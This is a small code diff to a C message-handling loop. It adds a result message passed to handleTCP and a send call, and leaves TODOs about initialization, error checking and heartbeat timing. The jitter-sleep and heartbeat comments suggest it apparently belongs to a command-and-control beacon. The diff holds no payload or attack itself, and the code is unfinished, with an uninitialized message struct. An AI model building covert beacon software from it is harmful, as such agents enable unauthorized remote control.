@@ -49,10 +49,15 @@ int receiveMessages(uint8_t* buffer, size_t bytes_received, Config* config)
 		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
 		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
 
-		handleTCP(buffer, bytes_received, config);
+        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
+		handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
 
-		// if heartbeat interval elapsed... 
-		// sendMessage(MessageType HEARTBEAT)
+        send(&resultMsg, config); // TODO: check return value for errors
+
+
+
+        // if heartbeat interval elapsed... 
+        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?
 
 		// sleepWithJitter()
 
